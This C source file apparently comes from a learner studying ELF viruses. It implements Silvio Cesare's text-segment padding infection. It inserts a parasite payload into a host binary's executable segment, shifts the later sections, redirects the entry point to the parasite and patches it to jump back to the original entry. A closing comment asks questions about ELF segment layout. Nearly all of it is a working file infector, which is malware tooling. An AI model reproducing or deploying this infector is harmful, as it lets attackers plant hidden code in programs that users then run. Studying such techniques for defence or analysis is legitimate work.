/* Inject an ELF by using Silvio's Cesare text appending
 * and padding method */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <elf.h>

#define MAX_PARASITE 4096
#define PAGE_SIZE 4096
#define TMP "tmp.bin"

#ifndef DEBUG
#define DEBUG 1 
#endif

int hfd, pfd;
int patch_position;
struct stat hst, pst;

void infect_elf();

int main(int argc, char **argv)
{
    if (argc != 4)
    {
        printf("usage: %s <host> <parasite> <patch-position>\n", argv[0]);
        exit(1);
    }

    patch_position = atoi(argv[3]);

    if ((hfd = open(argv[1], O_RDONLY)) == -1) 
    {
        perror("host open");
        exit(-1);
    }

    if ((pfd = open(argv[2], O_RDONLY)) == -1)
    {
        perror("parasite open");
        exit(-1);
    }

    if (fstat(hfd, &hst))
    {
        perror("host stat");
        exit(-1);
    }
     
    if (fstat(pfd, &pst))
    {
        perror("parasite stat");
        exit(-1);
    }

    unsigned long entry_point, text_offset, text_begin;
    unsigned char *mem;
    unsigned int entry_offset;
    unsigned char buf[MAX_PARASITE];
    unsigned int ehdr_size;
    int ofd;
    int psize;
    int text_found;
    Elf32_Ehdr *e_hdr;
    Elf32_Phdr *p_hdr;
    Elf32_Shdr *s_hdr;
    int i;


    psize = pst.st_size;
    if (DEBUG)
    {
        printf("psize = %d\n", psize);
    }

    mem = mmap(NULL, hst.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, hfd, 0);
    if (mem == MAP_FAILED)
    {
        perror("mmap");
        exit(-1);
    }

    e_hdr = (Elf32_Ehdr *) mem;
    entry_point = e_hdr->e_entry;
    ehdr_size = sizeof(*e_hdr);

    if (DEBUG)
    {
        printf("ehdr_size: %d\n", ehdr_size);
    }

    if (!(e_hdr->e_ident[0] == 0x7f && strcmp(&e_hdr->e_ident[1], "ELF")))
    {
        printf("host is not an ELF\n");
        exit(-1);
    }

    text_found = 0;
    p_hdr = (Elf32_Phdr *) (mem + e_hdr->e_phoff);

    // iterate over phdrs looking for the text segment
    for (i = e_hdr->e_phnum; i-- > 0; p_hdr++)
    {
        if (text_found) //&& p_hdr->p_offset >= entry_offset)
        {
            p_hdr->p_offset += PAGE_SIZE;
        }

        if (p_hdr->p_type == PT_LOAD)
            if (p_hdr->p_flags == (PF_R | PF_X))
            {
                text_found++;
                text_offset = p_hdr->p_offset; // offset of text segment on file
                text_begin = p_hdr->p_vaddr; 
                entry_offset = p_hdr->p_filesz; // offset to parasite entry point
                p_hdr->p_filesz += psize;
                p_hdr->p_memsz += psize;
                if (DEBUG)
                {
                    printf("Going to place parasite at 0x%x in file\n", 
                        text_offset + entry_offset); 
                    printf("Going to place parasite at 0x%x in image\n",
                        p_hdr->p_vaddr + entry_offset);
                }
            }
    }


    s_hdr = (Elf32_Shdr *) (mem + e_hdr->e_shoff);
    for (i = e_hdr->e_shnum; i-- > 0; s_hdr++)
    {
        if (s_hdr->sh_offset >= text_offset + entry_offset)
        {
            s_hdr->sh_offset += PAGE_SIZE;
        }
    }

    // push section header table
    e_hdr->e_shoff += PAGE_SIZE;

    // modify entry_point to point to parasite at the end of .text
    e_hdr->e_entry = text_begin + entry_offset;
    if (DEBUG)
    {
        printf("set entry point to 0x%x\n", e_hdr->e_entry);
    }
    // read parasite into buffer
    // I know this is a bad 
    if (read(pfd, buf, psize) == -1)
    {
        perror("parasite: read");
        exit(-1);
    }

    int preparasite_size_file = text_offset + entry_offset;
    int preparasite_size_image =  entry_offset - text_offset;
    if (DEBUG)
    {
        printf("preparasite_size_file = 0x%x\n", preparasite_size_file);
        printf("preparasite_size_image = 0x%x\n", preparasite_size_image);
    }

    // patch parasite code
    *(unsigned long *)&buf[patch_position] = entry_point;
    printf("Patching parasite to jmp to %x\n", entry_point);

    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, hst.st_mode)) == -1)
    {
        perror("tmp binary: open");
        exit(-1);
    }

    unsigned int wrote;

    if ((wrote = write(ofd, mem, preparasite_size_file)) != preparasite_size_file)
    {
        perror("tmp binary: write contents up to parasite");
        exit(-1);
    }
    if (DEBUG)
    {
        printf("wrote 0x%x bytes of preparasite information\n", wrote);
    }

    if ((wrote = write(ofd, buf, psize)) != psize) 
    {
        perror("tmp binary: write parasite");
        exit(-1);
    }
    if (DEBUG)
    {
        printf("wrote 0x%x bytes of parasite information\n", wrote);
    }

    if (DEBUG) 
    {
        printf("about to write 0x%x bytes to pad to PAGE_SIZE\n", PAGE_SIZE-psize);
    }
    // Physically insert the new code (parasite) and pad to PAGE_SIZE, into the file - text segment p_offset + p_filesz (original)
    if (lseek(ofd, PAGE_SIZE-psize, SEEK_CUR) < 0)
    {
        perror("seek");
        exit(-1);
    }

    mem += text_offset + entry_offset;
    if (write(ofd, mem, hst.st_size-preparasite_size_file) != hst.st_size-preparasite_size_file)
    {
        perror("tmp binary: write post injection");
        exit(-1);
    }

    close(ofd);
    
}

/* questions about ELF:
 * how does this work?
 *   Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
 *   LOAD           0x000000 0x08048000 0x08048000 0x005d0 0x005d0 R E 0x1000
 *   LOAD           0x0005d0 0x080495d0 0x080495d0 0x0011c 0x00120 RW  0x1000
 *   DYNAMIC        0x0005dc 0x080495dc 0x080495dc 0x000e8 0x000e8 RW  0x4
 *
 * particularly how can the DYNAMIC segment exist only 12 bytes in the file after
 * the data segment while the data segment's FileSiz is 284 bytes? Can segment's
 * exist within each other?
 *
 * any tool recommendations for inspecting the structure of the elf without abiding
 * by the elf headers? I'm using hexdump right now to make sure I padded up to 
 * PAGE_SIZE correctly.
 */

